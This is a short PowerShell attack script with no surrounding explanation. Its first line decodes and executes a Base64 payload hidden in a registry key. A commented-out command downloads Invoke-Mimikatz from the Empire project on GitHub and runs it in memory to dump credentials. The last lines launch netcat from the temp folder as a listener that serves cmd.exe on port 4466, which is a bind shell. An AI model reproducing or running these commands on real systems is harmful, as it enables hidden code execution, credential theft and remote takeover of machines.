iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\XSample').XXX)))
<#
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"
#>

$Command = "$Env:temp\nc64.exe -nLvp 4466 -e cmd.exe"
Invoke-Expression $Command
